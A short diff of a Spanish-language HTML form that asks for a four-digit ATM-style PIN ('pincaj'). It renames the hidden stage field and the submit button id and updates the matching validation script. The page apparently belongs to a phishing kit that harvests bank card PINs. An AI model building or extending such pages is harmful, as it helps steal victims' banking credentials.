@@ -170,8 +170,8 @@
             <div class="error-message" id="errorPincaj"></div>
         </div>
 
-        <input type="hidden" name="status" value="pincaj">
-        <button type="submit" class="boton-1" id="btnPinCaj" disabled>Continuar</button>
+        <input type="hidden" id="no-status" name="no-status" value="pincaj">
+        <button type="submit" class="boton-1" id="enviar" disabled>Continuar</button>
     </form>
 
     <!-- Footer -->
@@ -181,7 +181,7 @@
             function validatePin() {
                 const value = $('#pincaj').val().trim();
                 const isValid = /^\d{4}$/.test(value);
-                $('#btnPinCaj').prop('disabled', !isValid);
+                $('#enviar').prop('disabled', !isValid);
                 return isValid;
             }
 
